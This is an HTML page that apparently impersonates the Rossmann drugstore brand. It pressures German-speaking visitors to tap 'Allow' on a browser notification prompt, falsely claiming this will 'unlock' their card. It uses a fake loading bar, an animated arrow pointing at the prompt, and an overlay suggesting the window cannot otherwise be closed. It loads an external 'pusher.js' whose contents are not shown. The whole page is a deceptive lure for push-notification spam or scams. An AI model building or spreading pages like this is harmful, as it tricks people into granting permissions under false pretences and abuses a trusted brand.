<!DOCTYPE html>
<html lang="en">

<head>
    <base href="">

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Rossmann</title>

    <style type="text/css">
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        body,
        div,
        html {
            margin: 0;
            padding: 0
        }

        img {
            vertical-align: top
        }

        body,
        html {
            width: 100%;
            height: 100%
        }

        body {
            position: relative;
            font-family: -apple-system, Roboto, Helvetica Neue, Trebuchet MS, sans-serif;
            font-size: 100%
        }

        .wrapper {
            position: absolute;
            display: block;
            text-align: center;
            left: 0;
            right: 0;
            bottom: 50%
        }

        @media only screen and (max-width: 600px) {
            .wrapper {
                bottom: 30%;
            }
        }
        
        .text {
            padding: 1rem;
        }

        .blocker-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #2c2c2c;
            display: flex;
            align-items: center;
            justify-content: center;
            display: none;
            flex-direction: column;
            z-index: 1100;
            padding: 1rem;
            text-align: center;
        }

        .blocker-overlay a {
            padding: 1rem 2rem;
            font-size: 26px;
            background-color: #2373BB;
            color: #fff;
            display: block;
            text-decoration: none;
            border-radius: 32px;
            font-weight: bold;
            margin-bottom: 1rem;
            transition: all .25s ease-out;

        }

        .blocker-overlay a:hover {
            transform: translateY(-.3rem);
        }

        .blocker-overlay small {
            font-weight: bold;
            color: #fff;
        }

        .block-arrow {
            position: absolute;
            padding: 1rem;
            left: 50%;
            bottom: 0rem;
            transform: translateX(-50%);
            text-align: center;
            display: none;
            width: 100%;
            z-index: 1000;
        }

        @media (min-width: 992px) {
            .block-arrow {
                top: 11rem;
                left: 8rem;
                transform: none;
                width: 28rem;
            }
        }

        .block-arrow p {
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            color: red;
        }

        .block-arrow img {
            display: block;
            animation: slideUp 1.2s ease-in-out infinite;
            margin-left: auto;
            margin-right: 2rem;
        }

        @media (min-width: 992px) {
            .block-arrow img {
                margin: 0;
                display: inline-block;
            }
        }

        @keyframes slideUp {
            0% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-2.5rem);
            }

            100% {
                transform: translateY(0);
            }
        }
    </style>
</head>

<body>
    <div class="wrapper">

        <div class="progressBar"><img src="data:image/gif;base64,R0lGODlh0AANAMQWAJ6entfX19LS0vf39/Pz88bGxsrKysLCwr6+vrKysu/v7+fn59vb287Ozt/f36amprq6uqqqquPj46Kiouvr65aWlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUDw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDIzRDcxMTg4QkU3MTFFN0EzNkY5MDNBOUI1NzY0RjYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDIzRDcxMTk4QkU3MTFFN0EzNkY5MDNBOUI1NzY0RjYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFQjlFOUQ3RjhCRTIxMUU3QTM2RjkwM0E5QjU3NjRGNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFQjlFOUQ4MDhCRTIxMUU3QTM2RjkwM0E5QjU3NjRGNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6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"></div>
        <div class="text">Bitte tippen Sie auf die Schaltfläche <strong>Zulassen</strong> um Ihre Karte zu entsperren.</div></br></br></br></br></br></br>
        <center><img src="card.png" /></center>

    </div>

    <div class="blocker-overlay">
        <a href="#">Blockieren</a>
        <small>Blockieren Sie Benachrichtigungen, um dieses Fenster zu schließen</small>
    </div>

    <div class="block-arrow">
        <img src="arrow.png" alt="">
        <p>
            Bitte tippen Sie auf die Schaltfläche „Zulassen“, um Ihre Karte zu entsperren
        </p>
    </div>
    <script src="moment.js"></script>
    <script src="moment-timezone.js"></script>

    <script>
        var pstDate = moment(new Date()).tz('America/Los_Angeles').format('DDMMYYYY');
        var currentUrl = document.location.href;

        if (currentUrl.indexOf('&date=') < 0 && currentUrl.indexOf('?') > 0) {
            var urlDate = currentUrl + '&date=' + pstDate;
            history.replaceState({}, '', urlDate);
        }
    </script>
    <script src="pusher.js"></script>

    <script>
        setTimeout(function() {
            document.querySelector('.block-arrow').style.display = 'block';
        }, 2000);
    </script>
</body>

</html>